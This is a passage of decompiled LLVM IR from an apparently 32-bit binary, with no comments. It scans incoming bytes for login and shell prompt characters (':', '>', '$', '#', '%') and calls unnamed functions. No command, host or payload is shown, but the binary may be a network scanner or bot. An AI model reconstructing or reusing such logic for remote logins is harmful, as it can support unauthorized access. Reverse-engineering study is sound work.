  store i32 %v0_80507b2, i32* %eax.global-to-local, align 4
  store i32 %v0_80507b2, i32* @ebp, align 4
  %v10_80507bc = icmp eq i32 %v0_80507b2, -1
  %v1_80507bf = icmp eq i1 %v10_80507bc, false
  br i1 %v1_80507bf, label %dec_label_pc_8050c17, label %dec_label_pc_80505d3.loopexit12.loopexit

dec_label_pc_80507d0:                             ; preds = %dec_label_pc_8050645
  %v1_80507d0 = add i32 %v0_8050645, 24
  %v2_80507d0 = inttoptr i32 %v1_80507d0 to i32*
  %v3_80507d0 = load i32, i32* %v2_80507d0, align 4
  %v1_80507d3 = add i32 %v3_80507d0, -1
  store i32 %v1_80507d3, i32* %eax.global-to-local, align 4
  %tmp141 = icmp slt i32 %v1_80507d3, 1
  br i1 %tmp141, label %dec_label_pc_80505d3.loopexit12.loopexit, label %dec_label_pc_80507dc.preheader

dec_label_pc_80507dc.preheader:                   ; preds = %dec_label_pc_80507d0
  %v7_80507dc.pre = load i32, i32* @edx, align 4
  %v2_80507dc = add i32 %v0_8050645, 28
  br label %dec_label_pc_80507dc

dec_label_pc_80507dc:                             ; preds = %dec_label_pc_80507dc.preheader, %dec_label_pc_805080d
  %v7_80507dc = phi i32 [ %v7_80507dc.pre, %dec_label_pc_80507dc.preheader ], [ %v9_80507dc, %dec_label_pc_805080d ]
  %v0_8050d4f = phi i32 [ %v1_80507d3, %dec_label_pc_80507dc.preheader ], [ %v1_805080d, %dec_label_pc_805080d ]
  %v3_80507dc = add i32 %v2_80507dc, %v0_8050d4f
  %v4_80507dc = inttoptr i32 %v3_80507dc to i8*
  %v5_80507dc = load i8, i8* %v4_80507dc, align 1
  %v6_80507dc = zext i8 %v5_80507dc to i32
  %v8_80507dc = and i32 %v7_80507dc, -256
  %v9_80507dc = or i32 %v6_80507dc, %v8_80507dc
  store i32 %v9_80507dc, i32* %edx.global-to-local, align 4
  %v10_80507e0 = icmp eq i8 %v5_80507dc, 58
  br i1 %v10_80507e0, label %dec_label_pc_8050d4f, label %dec_label_pc_80507e9

dec_label_pc_80507e9:                             ; preds = %dec_label_pc_80507dc
  %v10_80507e9 = icmp eq i8 %v5_80507dc, 62
  br i1 %v10_80507e9, label %dec_label_pc_8050d4f, label %dec_label_pc_80507f2

dec_label_pc_80507f2:                             ; preds = %dec_label_pc_80507e9
  %v10_80507f2 = icmp eq i8 %v5_80507dc, 36
  br i1 %v10_80507f2, label %dec_label_pc_8050d4f, label %dec_label_pc_80507fb

dec_label_pc_80507fb:                             ; preds = %dec_label_pc_80507f2
  %v10_80507fb = icmp eq i8 %v5_80507dc, 35
  br i1 %v10_80507fb, label %dec_label_pc_8050d4f, label %dec_label_pc_8050804

dec_label_pc_8050804:                             ; preds = %dec_label_pc_80507fb
  %v10_8050804 = icmp eq i8 %v5_80507dc, 37
  br i1 %v10_8050804, label %dec_label_pc_8050d4f, label %dec_label_pc_805080d

dec_label_pc_805080d:                             ; preds = %dec_label_pc_8050804
  %v1_805080d = add i32 %v0_8050d4f, -1
  %v8_805080d = icmp eq i32 %v1_805080d, 0
  store i32 %v1_805080d, i32* %eax.global-to-local, align 4
  %v1_805080e = icmp eq i1 %v8_805080d, false
  br i1 %v1_805080e, label %dec_label_pc_80507dc, label %dec_label_pc_80505d3.backedge

dec_label_pc_8050815:                             ; preds = %dec_label_pc_8050645
  %v1_8050815 = add i32 %v0_8050645, 24
  %v2_8050815 = inttoptr i32 %v1_8050815 to i32*
  %v3_8050815 = load i32, i32* %v2_8050815, align 4
  %v1_8050818 = add i32 %v3_8050815, -1
  store i32 %v1_8050818, i32* %eax.global-to-local, align 4
  %tmp142 = icmp slt i32 %v1_8050818, 1
  br i1 %tmp142, label %dec_label_pc_80505d3.loopexit12.loopexit, label %dec_label_pc_8050821.preheader

dec_label_pc_8050821.preheader:                   ; preds = %dec_label_pc_8050815
  %v7_8050821.pre = load i32, i32* @edx, align 4
  %v2_8050821 = add i32 %v0_8050645, 28
  br label %dec_label_pc_8050821

dec_label_pc_8050821:                             ; preds = %dec_label_pc_8050821.preheader, %dec_label_pc_8050852
  %v7_8050821 = phi i32 [ %v7_8050821.pre, %dec_label_pc_8050821.preheader ], [ %v9_8050821, %dec_label_pc_8050852 ]
  %v0_8050c5d = phi i32 [ %v1_8050818, %dec_label_pc_8050821.preheader ], [ %v1_8050852, %dec_label_pc_8050852 ]
  %v3_8050821 = add i32 %v2_8050821, %v0_8050c5d
  %v4_8050821 = inttoptr i32 %v3_8050821 to i8*
  %v5_8050821 = load i8, i8* %v4_8050821, align 1
  %v6_8050821 = zext i8 %v5_8050821 to i32
  %v8_8050821 = and i32 %v7_8050821, -256
  %v9_8050821 = or i32 %v6_8050821, %v8_8050821
  store i32 %v9_8050821, i32* %edx.global-to-local, align 4
  %v10_8050825 = icmp eq i8 %v5_8050821, 58
  br i1 %v10_8050825, label %dec_label_pc_8050c5d, label %dec_label_pc_805082e

dec_label_pc_805082e:                             ; preds = %dec_label_pc_8050821
  %v10_805082e = icmp eq i8 %v5_8050821, 62
  br i1 %v10_805082e, label %dec_label_pc_8050c5d, label %dec_label_pc_8050837

dec_label_pc_8050837:                             ; preds = %dec_label_pc_805082e
  %v10_8050837 = icmp eq i8 %v5_8050821, 36
  br i1 %v10_8050837, label %dec_label_pc_8050c5d, label %dec_label_pc_8050840

dec_label_pc_8050840:                             ; preds = %dec_label_pc_8050837
  %v10_8050840 = icmp eq i8 %v5_8050821, 35
  br i1 %v10_8050840, label %dec_label_pc_8050c5d, label %dec_label_pc_8050849

dec_label_pc_8050849:                             ; preds = %dec_label_pc_8050840
  %v10_8050849 = icmp eq i8 %v5_8050821, 37
  br i1 %v10_8050849, label %dec_label_pc_8050c5d, label %dec_label_pc_8050852

dec_label_pc_8050852:                             ; preds = %dec_label_pc_8050849
  %v1_8050852 = add i32 %v0_8050c5d, -1
  %v8_8050852 = icmp eq i32 %v1_8050852, 0
  store i32 %v1_8050852, i32* %eax.global-to-local, align 4
  %v1_8050853 = icmp eq i1 %v8_8050852, false
  br i1 %v1_8050853, label %dec_label_pc_8050821, label %dec_label_pc_80505d3.backedge

dec_label_pc_8050860:                             ; preds = %dec_label_pc_8050645
  %v0_8050860 = load i32, i32* @esp, align 4
  %v1_8050863 = add i32 %v0_8050860, -16
  %v2_8050863 = inttoptr i32 %v1_8050863 to i32*
  store i32 26, i32* %v2_8050863, align 4
  %v2_8050865 = call i32 @function_80512f0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050865, i32* %eax.global-to-local, align 4
  %v0_805086a = load i32, i32* @esp, align 4
  %v1_805086a = inttoptr i32 %v0_805086a to i32*
  %v2_805086a = load i32, i32* %v1_805086a, align 4
  store i32 %v2_805086a, i32* %eax.global-to-local, align 4
  %v3_805086a = add i32 %v0_805086a, 4
  %v1_805086b = inttoptr i32 %v3_805086a to i32*
  %v2_805086b = load i32, i32* %v1_805086b, align 4
  store i32 %v2_805086b, i32* %edx.global-to-local, align 4
  %v1_805086c = add i32 %v0_805086a, 1880
  store i32 %v1_805086c, i32* %ecx.global-to-local, align 4
  store i32 %v1_805086c, i32* %v1_805086b, align 4
  store i32 26, i32* %v1_805086a, align 4
  %v3_8050876 = call i32 @function_8051240(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050876, i32* %eax.global-to-local, align 4
  %v0_805087b = load i32, i32* @esp, align 4
  %v1_805087b = add i32 %v0_805087b, 1880
  %v2_805087b = inttoptr i32 %v1_805087b to i32*
  %v3_805087b = load i32, i32* %v2_805087b, align 4
  %v1_8050882 = add i32 %v3_805087b, -1
  store i32 %v1_8050882, i32* %edx.global-to-local, align 4
  %v2_8050883 = add i32 %v0_805087b, -4
  %v3_8050883 = inttoptr i32 %v2_8050883 to i32*
  store i32 %v1_8050882, i32* %v3_8050883, align 4
  %v2_8050884 = add i32 %v0_805087b, -8
  %v3_8050884 = inttoptr i32 %v2_8050884 to i32*
  store i32 %v3_8050876, i32* %v3_8050884, align 4
  %v0_8050885 = load i32, i32* @edi, align 4
  %v1_8050885 = add i32 %v0_8050885, 24
  %v2_8050885 = inttoptr i32 %v1_8050885 to i32*
  %v3_8050885 = load i32, i32* %v2_8050885, align 4
  store i32 %v3_8050885, i32* %eax.global-to-local, align 4
  %v2_8050888 = add i32 %v0_805087b, -12
  %v3_8050888 = inttoptr i32 %v2_8050888 to i32*
  store i32 %v3_8050885, i32* %v3_8050888, align 4
  %v1_8050889 = add i32 %v0_805087b, 32
  %v2_8050889 = inttoptr i32 %v1_8050889 to i32*
  %v3_8050889 = load i32, i32* %v2_8050889, align 4
  store i32 %v3_8050889, i32* %eax.global-to-local, align 4
  %v2_805088d = add i32 %v0_805087b, -16
  %v3_805088d = inttoptr i32 %v2_805088d to i32*
  store i32 %v3_8050889, i32* %v3_805088d, align 4
  %v0_805088e = call i32 @function_8051cf0()
  %v0_8050893 = load i32, i32* @esp, align 4
  %v1_8050896 = add i32 %v0_805088e, 1
  %v8_8050896 = icmp eq i32 %v1_8050896, 0
  store i32 %v1_8050896, i32* %eax.global-to-local, align 4
  %v1_8050897 = icmp eq i1 %v8_8050896, false
  %v1_8050e44 = add i32 %v0_8050893, 16
  %v2_8050e44 = inttoptr i32 %v1_8050e44 to i32*
  store i32 26, i32* %v2_8050e44, align 4
  %v2_8050e46 = call i32 @function_8051270(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050e46, i32* %eax.global-to-local, align 4
  %v0_8050e4b = load i32, i32* @esp, align 4
  %v1_8050e4b = inttoptr i32 %v0_8050e4b to i32*
  br i1 %v1_8050897, label %dec_label_pc_8050e41, label %dec_label_pc_805089d

dec_label_pc_805089d:                             ; preds = %dec_label_pc_8050860
  store i32 25, i32* %v1_8050e4b, align 4
  %v2_80508ae = call i32 @function_80512f0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80508ae, i32* %eax.global-to-local, align 4
  %v0_80508b3 = load i32, i32* @esp, align 4
  %v1_80508b3 = inttoptr i32 %v0_80508b3 to i32*
  %v3_80508b3 = add i32 %v0_80508b3, 4
  %v1_80508b4 = inttoptr i32 %v3_80508b3 to i32*
  %v1_80508b5 = add i32 %v0_80508b3, 1880
  store i32 %v1_80508b5, i32* %eax.global-to-local, align 4
  store i32 %v1_80508b5, i32* %v1_80508b4, align 4
  store i32 25, i32* %v1_80508b3, align 4
  %v3_80508bf = call i32 @function_8051240(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_80508bf, i32* %eax.global-to-local, align 4
  %v0_80508c4 = load i32, i32* @esp, align 4
  %v1_80508c4 = add i32 %v0_80508c4, 1880
  %v2_80508c4 = inttoptr i32 %v1_80508c4 to i32*
  %v3_80508c4 = load i32, i32* %v2_80508c4, align 4
  %v1_80508cb = add i32 %v3_80508c4, -1
  store i32 %v1_80508cb, i32* %edx.global-to-local, align 4
  %v2_80508cc = add i32 %v0_80508c4, -4
  %v3_80508cc = inttoptr i32 %v2_80508cc to i32*
  store i32 %v1_80508cb, i32* %v3_80508cc, align 4
  %v2_80508cd = add i32 %v0_80508c4, -8
  %v3_80508cd = inttoptr i32 %v2_80508cd to i32*
  store i32 %v3_80508bf, i32* %v3_80508cd, align 4
  %v0_80508ce = load i32, i32* @edi, align 4
  %v1_80508ce = add i32 %v0_80508ce, 24
  %v2_80508ce = inttoptr i32 %v1_80508ce to i32*
  %v3_80508ce = load i32, i32* %v2_80508ce, align 4
  store i32 %v3_80508ce, i32* @esi, align 4
  %v2_80508d1 = add i32 %v0_80508c4, -12
  %v3_80508d1 = inttoptr i32 %v2_80508d1 to i32*
  store i32 %v3_80508ce, i32* %v3_80508d1, align 4
  %v1_80508d2 = add i32 %v0_80508c4, 32
  %v2_80508d2 = inttoptr i32 %v1_80508d2 to i32*
  %v3_80508d2 = load i32, i32* %v2_80508d2, align 4
  store i32 %v3_80508d2, i32* @ebx, align 4
  %v2_80508d6 = add i32 %v0_80508c4, -16
  %v3_80508d6 = inttoptr i32 %v2_80508d6 to i32*
  store i32 %v3_80508d2, i32* %v3_80508d6, align 4
  %v0_80508d7 = call i32 @function_8051cf0()
  store i32 %v0_80508d7, i32* %eax.global-to-local, align 4
  %v0_80508dc = load i32, i32* @esp, align 4
  store i32 %v0_80508d7, i32* @ebp, align 4
  %v1_80508e1 = add i32 %v0_80508dc, 16
  %v2_80508e1 = inttoptr i32 %v1_80508e1 to i32*
  store i32 25, i32* %v2_80508e1, align 4
  %v2_80508e3 = call i32 @function_8051270(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80508e3, i32* %eax.global-to-local, align 4
  %v0_80508e8 = load i32, i32* @esp, align 4
  %v0_80508eb = load i32, i32* @ebp, align 4
  %v10_80508eb = icmp eq i32 %v0_80508eb, -1
  br i1 %v10_80508eb, label %dec_label_pc_80505d3.loopexit12.loopexit, label %dec_label_pc_80508f4

dec_label_pc_80508f4:                             ; preds = %dec_label_pc_805089d
  %tmp143 = icmp slt i32 %v0_80508eb, 1
  br i1 %tmp143, label %dec_label_pc_8050a73, label %dec_label_pc_80508fc

dec_label_pc_80508fc:                             ; preds = %dec_label_pc_80508f4
  %v0_80508fc = load i32, i32* @edi, align 4
  %v1_80508fc = inttoptr i32 %v0_80508fc to i32*
  %v2_80508fc = load i32, i32* %v1_80508fc, align 4
  store i32 %v2_80508fc, i32* %edx.global-to-local, align 4
  %v1_80508fe = add i32 %v0_80508fc, 16
  %v2_80508fe = inttoptr i32 %v1_80508fe to i32*
  %v3_80508fe = load i32, i32* %v2_80508fe, align 4
  store i32 %v3_80508fe, i32* %eax.global-to-local, align 4
  %v2_8050901 = add i32 %v0_80508e8, 52
  %v3_8050901 = inttoptr i32 %v2_8050901 to i32*
  store i32 %v2_80508fc, i32* %v3_8050901, align 4
  %v0_8050905 = load i32, i32* @edi, align 4
  %v1_8050905 = add i32 %v0_8050905, 20
  %v2_8050905 = inttoptr i32 %v1_8050905 to i32*
  %v3_8050905 = load i32, i32* %v2_8050905, align 4
  store i32 %v3_8050905, i32* %edx.global-to-local, align 4
  %v0_8050908 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050908 = load i32, i32* @esp, align 4
  %v2_8050908 = add i32 %v1_8050908, 1872
  %v3_8050908 = inttoptr i32 %v2_8050908 to i32*
  store i32 %v0_8050908, i32* %v3_8050908, align 4
  %v0_805090f = load i32, i32* %edx.global-to-local, align 4
  %v1_805090f = trunc i32 %v0_805090f to i16
  %v2_805090f = load i32, i32* @esp, align 4
  %v3_805090f = add i32 %v2_805090f, 1882
  %v4_805090f = inttoptr i32 %v3_805090f to i16*
  store i16 %v1_805090f, i16* %v4_805090f, align 2
  %v0_8050917 = call i32 @function_805220f()
  store i32 %v0_8050917, i32* %eax.global-to-local, align 4
  %tmp144 = icmp slt i32 %v0_8050917, 1
  br i1 %tmp144, label %dec_label_pc_805107e, label %dec_label_pc_8050924

dec_label_pc_8050924:                             ; preds = %dec_label_pc_805109f, %dec_label_pc_805107e, %dec_label_pc_80508fc
  %v0_8050924 = load i32, i32* @esp, align 4
  %v0_8050927 = load i32, i32* @edi, align 4
  %v1_8050927 = add i32 %v0_8050927, 4
  %v2_8050927 = inttoptr i32 %v1_8050927 to i32*
  %v3_8050927 = load i32, i32* %v2_8050927, align 4
  store i32 %v3_8050927, i32* @esi, align 4
  %v2_805092a = add i32 %v0_8050924, -16
  %v3_805092a = inttoptr i32 %v2_805092a to i32*
  store i32 %v3_8050927, i32* %v3_805092a, align 4
  %v1_805092b = call i32 @function_80521e1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_805092b, i32* %eax.global-to-local, align 4
  %v0_8050930 = load i32, i32* @edi, align 4
  %v1_8050930 = add i32 %v0_8050930, 4
  %v2_8050930 = inttoptr i32 %v1_8050930 to i32*
  store i32 -1, i32* %v2_8050930, align 4
  %v0_8050937 = load i32, i32* @edi, align 4
  %v1_8050937 = add i32 %v0_8050937, 12
  %v2_8050937 = inttoptr i32 %v1_8050937 to i32*
  store i32 0, i32* %v2_8050937, align 4
  br label %dec_label_pc_8050941

dec_label_pc_8050941:                             ; preds = %dec_label_pc_8050a73, %dec_label_pc_8050cea, %dec_label_pc_80509be, %dec_label_pc_8051000, %dec_label_pc_8050e74, %dec_label_pc_8050c71, %dec_label_pc_8050d63, %dec_label_pc_8050c1f, %dec_label_pc_8050bce, %dec_label_pc_80506dc, %dec_label_pc_8050ddc, %dec_label_pc_8050924
  %v0_8050941 = load i32, i32* @edi, align 4
  %v1_8050941 = add i32 %v0_8050941, 24
  %v2_8050941 = inttoptr i32 %v1_8050941 to i32*
  %v3_8050941 = load i32, i32* %v2_8050941, align 4
  store i32 %v3_8050941, i32* @edx, align 4
  store i32 %v3_8050941, i32* %eax.global-to-local, align 4
  %v1_8050946 = load i32, i32* @ebp, align 4
  %v2_8050946 = sub i32 %v3_8050941, %v1_8050946
  %v8_8050946 = xor i32 %v1_8050946, %v3_8050941
  %v9_8050946 = xor i32 %v2_8050946, %v3_8050941
  %v10_8050946 = and i32 %v9_8050946, %v8_8050946
  %v11_8050946 = icmp slt i32 %v10_8050946, 0
  %v12_8050946 = icmp eq i32 %v2_8050946, 0
  %v13_8050946 = icmp slt i32 %v2_8050946, 0
  %v3_8050948 = icmp ne i1 %v13_8050946, %v11_8050946
  %v4_8050948 = or i1 %v12_8050946, %v3_8050948
  br i1 %v4_8050948, label %dec_label_pc_805094c, label %dec_label_pc_805094a

dec_label_pc_805094a:                             ; preds = %dec_label_pc_8050941
  store i32 %v1_8050946, i32* @edx, align 4
  br label %dec_label_pc_805094c

dec_label_pc_805094c:                             ; preds = %dec_label_pc_8050941, %dec_label_pc_805094a
  %v1_805094c = phi i32 [ %v3_8050941, %dec_label_pc_8050941 ], [ %v1_8050946, %dec_label_pc_805094a ]
  %v2_805094c = sub i32 %v3_8050941, %v1_805094c
  store i32 %v2_805094c, i32* %eax.global-to-local, align 4
  store i32 %v2_805094c, i32* %v2_8050941, align 4
  %v0_8050951 = load i32, i32* @ebx, align 4
  %v1_8050951 = load i32, i32* @esp, align 4
  %v2_8050951 = add i32 %v1_8050951, -4
  %v3_8050951 = inttoptr i32 %v2_8050951 to i32*
  store i32 %v0_8050951, i32* %v3_8050951, align 4
  %v0_8050952 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050952 = add i32 %v1_8050951, -8
  %v3_8050952 = inttoptr i32 %v2_8050952 to i32*
  store i32 %v0_8050952, i32* %v3_8050952, align 4
  %v1_8050953 = add i32 %v1_8050951, 16
  %v2_8050953 = inttoptr i32 %v1_8050953 to i32*
  %v3_8050953 = load i32, i32* %v2_8050953, align 4
  %v1_8050957 = load i32, i32* @edx, align 4
  %v2_8050957 = add i32 %v1_8050957, %v3_8050953
  store i32 %v2_8050957, i32* %eax.global-to-local, align 4
  %v2_8050959 = add i32 %v1_8050951, -12
  %v3_8050959 = inttoptr i32 %v2_8050959 to i32*
  store i32 %v2_8050957, i32* %v3_8050959, align 4
  %v3_805095a = load i32, i32* %v2_8050953, align 4
  store i32 %v3_805095a, i32* %ecx.global-to-local, align 4
  %v2_805095e = add i32 %v1_8050951, -16
  %v3_805095e = inttoptr i32 %v2_805095e to i32*
  store i32 %v3_805095a, i32* %v3_805095e, align 4
  %v4_805095f = call i32 @function_8052743(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805095f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050645

dec_label_pc_805096c:                             ; preds = %dec_label_pc_8050645
  %v1_805096c = add i32 %v0_8050645, 24
  %v2_805096c = inttoptr i32 %v1_805096c to i32*
  %v3_805096c = load i32, i32* %v2_805096c, align 4
  %v1_805096f = add i32 %v3_805096c, -1
  store i32 %v1_805096f, i32* %eax.global-to-local, align 4
  %tmp145 = icmp slt i32 %v1_805096f, 1
  br i1 %tmp145, label %dec_label_pc_80505d3.loopexit12.loopexit, label %dec_label_pc_8050978

dec_label_pc_8050978:                             ; preds = %dec_label_pc_805096c
  %v2_8050978 = add i32 %v0_8050645, 27
  %v3_8050978 = add i32 %v2_8050978, %v3_805096c
  %v4_8050978 = inttoptr i32 %v3_8050978 to i8*
  %v5_8050978 = load i8, i8* %v4_8050978, align 1
  %v6_8050978 = zext i8 %v5_8050978 to i32
  %v7_8050978 = load i32, i32* @edx, align 4
  %v8_8050978 = and i32 %v7_8050978, -256
  %v9_8050978 = or i32 %v8_8050978, %v6_8050978
  store i32 %v9_8050978, i32* %edx.global-to-local, align 4
  %v10_805097c = icmp eq i8 %v5_8050978, 62
  br i1 %v10_805097c, label %dec_label_pc_80509aa.thread, label %dec_label_pc_8050981

dec_label_pc_8050981:                             ; preds = %dec_label_pc_8050978
  %v10_8050981 = icmp eq i8 %v5_8050978, 58
  br i1 %v10_8050981, label %dec_label_pc_80509aa.thread, label %dec_label_pc_8050986

dec_label_pc_8050986:                             ; preds = %dec_label_pc_8050981, %dec_label_pc_80509a5
  %v0_8050995 = phi i32 [ %v1_8050995, %dec_label_pc_80509a5 ], [ %v1_805096f, %dec_label_pc_8050981 ]
  %v7_805099c = phi i32 [ %v9_805099c, %dec_label_pc_80509a5 ], [ %v9_8050978, %dec_label_pc_8050981 ]
  %v1_8050986 = trunc i32 %v7_805099c to i8
  %v10_8050986 = icmp eq i8 %v1_8050986, 36
  br i1 %v10_8050986, label %dec_label_pc_80509aa, label %dec_label_pc_805098b

dec_label_pc_805098b:                             ; preds = %dec_label_pc_8050986
  %v10_805098b = icmp eq i8 %v1_8050986, 35
  br i1 %v10_805098b, label %dec_label_pc_80509aa, label %dec_label_pc_8050990

dec_label_pc_8050990:                             ; preds = %dec_label_pc_805098b
  %v10_8050990 = icmp eq i8 %v1_8050986, 37
  br i1 %v10_8050990, label %dec_label_pc_80509aa, label %dec_label_pc_8050995

dec_label_pc_8050995:                             ; preds = %dec_label_pc_8050990
  %v1_8050995 = add i32 %v0_8050995, -1
  %v8_8050995 = icmp eq i32 %v1_8050995, 0
  store i32 %v1_8050995, i32* %eax.global-to-local, align 4
  br i1 %v8_8050995, label %dec_label_pc_80505d3.backedge, label %dec_label_pc_805099c

dec_label_pc_805099c:                             ; preds = %dec_label_pc_8050995
  %v3_805099c = add i32 %v2_8050978, %v0_8050995
  %v4_805099c = inttoptr i32 %v3_805099c to i8*
  %v5_805099c = load i8, i8* %v4_805099c, align 1
  %v6_805099c = zext i8 %v5_805099c to i32
  %v8_805099c = and i32 %v7_805099c, -256
  %v9_805099c = or i32 %v6_805099c, %v8_805099c
  store i32 %v9_805099c, i32* %edx.global-to-local, align 4
  %v10_80509a0 = icmp eq i8 %v5_805099c, 58
  br i1 %v10_80509a0, label %dec_label_pc_80509aa, label %dec_label_pc_80509a5

dec_label_pc_80509a5:                             ; preds = %dec_label_pc_805099c
  %v10_80509a5 = icmp eq i8 %v5_805099c, 62
  %v1_80509a8 = icmp eq i1 %v10_80509a5, false
  br i1 %v1_80509a8, label %dec_label_pc_8050986, label %dec_label_pc_80509aa

dec_label_pc_80509aa.thread:                      ; preds = %dec_label_pc_8050981, %dec_label_pc_8050978
  store i32 %v3_805096c, i32* @ebp, align 4
  br label %dec_label_pc_80509b6

dec_label_pc_80509aa:                             ; preds = %dec_label_pc_80509a5, %dec_label_pc_805099c, %dec_label_pc_8050990, %dec_label_pc_805098b, %dec_label_pc_8050986
  %v0_80509aa = phi i32 [ %v0_8050995, %dec_label_pc_8050986 ], [ %v0_8050995, %dec_label_pc_805098b ], [ %v0_8050995, %dec_label_pc_8050990 ], [ %v1_8050995, %dec_label_pc_805099c ], [ %v1_8050995, %dec_label_pc_80509a5 ]
  %v1_80509aa = add i32 %v0_80509aa, 1
  store i32 %v1_80509aa, i32* @ebp, align 4
  %v10_80509ad = icmp eq i32 %v0_80509aa, -2
  br i1 %v10_80509ad, label %dec_label_pc_80505d3.loopexit12.loopexit, label %dec_label_pc_80509b6

dec_label_pc_80509b6:                             ; preds = %dec_label_pc_80509aa.thread, %dec_label_pc_80509aa
  %v1_80509aa160 = phi i32 [ %v3_805096c, %dec_label_pc_80509aa.thread ], [ %v1_80509aa, %dec_label_pc_80509aa ]
  %tmp146 = icmp slt i32 %v1_80509aa160, 1
  br i1 %tmp146, label %dec_label_pc_8050a73, label %dec_label_pc_80509be

dec_label_pc_80509be:                             ; preds = %dec_label_pc_80509b6
  %v0_80509be = load i32, i32* @esp, align 4
  %v1_80509c1 = add i32 %v0_80509be, -16
  %v2_80509c1 = inttoptr i32 %v1_80509c1 to i32*
  store i32 20, i32* %v2_80509c1, align 4
  %v2_80509c3 = call i32 @function_80512f0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80509c3, i32* %eax.global-to-local, align 4
  %v0_80509c8 = load i32, i32* @esp, align 4
  %v1_80509c8 = inttoptr i32 %v0_80509c8 to i32*
  %v2_80509c8 = load i32, i32* %v1_80509c8, align 4
  store i32 %v2_80509c8, i32* %eax.global-to-local, align 4
  %v3_80509c8 = add i32 %v0_80509c8, 4
  %v1_80509c9 = inttoptr i32 %v3_80509c8 to i32*
  %v2_80509c9 = load i32, i32* %v1_80509c9, align 4
  store i32 %v2_80509c9, i32* %edx.global-to-local, align 4
  %v1_80509ca = add i32 %v0_80509c8, 1888
  store i32 %v1_80509ca, i32* %eax.global-to-local, align 4
  store i32 %v1_80509ca, i32* %v1_80509c9, align 4
  store i32 20, i32* %v1_80509c8, align 4
  %v3_80509d4 = call i32 @function_8051240(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_80509d4, i32* %eax.global-to-local, align 4
  %v0_80509d9 = load i32, i32* @esp, align 4
  %v1_80509d9 = add i32 %v0_80509d9, -4
  %v2_80509d9 = inttoptr i32 %v1_80509d9 to i32*
  store i32 16384, i32* %v2_80509d9, align 4
  %v1_80509de = add i32 %v0_80509d9, 1888
  %v2_80509de = inttoptr i32 %v1_80509de to i32*
  %v3_80509de = load i32, i32* %v2_80509de, align 4
  store i32 %v3_80509de, i32* @esi, align 4
  %v2_80509e5 = add i32 %v0_80509d9, -8
  %v3_80509e5 = inttoptr i32 %v2_80509e5 to i32*
  store i32 %v3_80509de, i32* %v3_80509e5, align 4
  %v2_80509e6 = add i32 %v0_80509d9, -12
  %v3_80509e6 = inttoptr i32 %v2_80509e6 to i32*
  store i32 %v3_80509d4, i32* %v3_80509e6, align 4
  %v0_80509e7 = load i32, i32* @edi, align 4
  %v1_80509e7 = add i32 %v0_80509e7, 4
  %v2_80509e7 = inttoptr i32 %v1_80509e7 to i32*
  %v3_80509e7 = load i32, i32* %v2_80509e7, align 4
  store i32 %v3_80509e7, i32* @ebx, align 4
  %v2_80509ea = add i32 %v0_80509d9, -16
  %v3_80509ea = inttoptr i32 %v2_80509ea to i32*
  store i32 %v3_80509e7, i32* %v3_80509ea, align 4
  %v0_80509eb = call i32 @function_8052924()
  store i32 %v0_80509eb, i32* %eax.global-to-local, align 4
  %v0_80509f0 = load i32, i32* @esp, align 4
  %v1_80509f3 = add i32 %v0_80509f0, 28
  %v2_80509f3 = inttoptr i32 %v1_80509f3 to i32*
  store i32 16384, i32* %v2_80509f3, align 4
  %v1_80509f8 = add i32 %v0_80509f0, 24
  %v2_80509f8 = inttoptr i32 %v1_80509f8 to i32*
  store i32 2, i32* %v2_80509f8, align 4
  %v1_80509fa = add i32 %v0_80509f0, 20
  %v2_80509fa = inttoptr i32 %v1_80509fa to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_80509fa, align 4
  %v0_80509ff = load i32, i32* @edi, align 4
  %v1_80509ff = add i32 %v0_80509ff, 4
  %v2_80509ff = inttoptr i32 %v1_80509ff to i32*
  %v3_80509ff = load i32, i32* %v2_80509ff, align 4
  store i32 %v3_80509ff, i32* %ecx.global-to-local, align 4
  %v2_8050a02 = add i32 %v0_80509f0, 16
  %v3_8050a02 = inttoptr i32 %v2_8050a02 to i32*
  store i32 %v3_80509ff, i32* %v3_8050a02, align 4
  %v0_8050a03 = call i32 @function_8052924()
  store i32 %v0_8050a03, i32* %eax.global-to-local, align 4
  %v0_8050a08 = load i32, i32* @esp, align 4
  %v1_8050a08 = inttoptr i32 %v0_8050a08 to i32*
  store i32 20, i32* %v1_8050a08, align 4
  %v2_8050a0f = call i32 @function_8051270(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050a0f, i32* %eax.global-to-local, align 4
  %v0_8050a17 = load i32, i32* @edi, align 4
  %v1_8050a17 = add i32 %v0_8050a17, 12
  %v2_8050a17 = inttoptr i32 %v1_8050a17 to i32*
  store i32 8, i32* %v2_8050a17, align 4
  br label %dec_label_pc_8050941

dec_label_pc_8050a23:                             ; preds = %dec_label_pc_8050645
  %v1_8050a23 = add i32 %v0_8050645, 24
  %v2_8050a23 = inttoptr i32 %v1_8050a23 to i32*
  %v3_8050a23 = load i32, i32* %v2_8050a23, align 4
  %v1_8050a26 = add i32 %v3_8050a23, -1
  store i32 %v1_8050a26, i32* %eax.global-to-local, align 4
  %tmp147 = icmp slt i32 %v1_8050a26, 1
  br i1 %tmp147, label %dec_label_pc_80505d3.loopexit12.loopexit, label %dec_label_pc_8050a2f.preheader

dec_label_pc_8050a2f.preheader:                   ; preds = %dec_label_pc_8050a23
  %v7_8050a2f.pre = load i32, i32* @edx, align 4
  %v2_8050a2f = add i32 %v0_8050645, 28
  br label %dec_label_pc_8050a2f

dec_label_pc_8050a2f:                             ; preds = %dec_label_pc_8050a2f.preheader, %dec_label_pc_8050a60
  %v7_8050a2f = phi i32 [ %v7_8050a2f.pre, %dec_label_pc_8050a2f.preheader ], [ %v9_8050a2f, %dec_label_pc_8050a60 ]
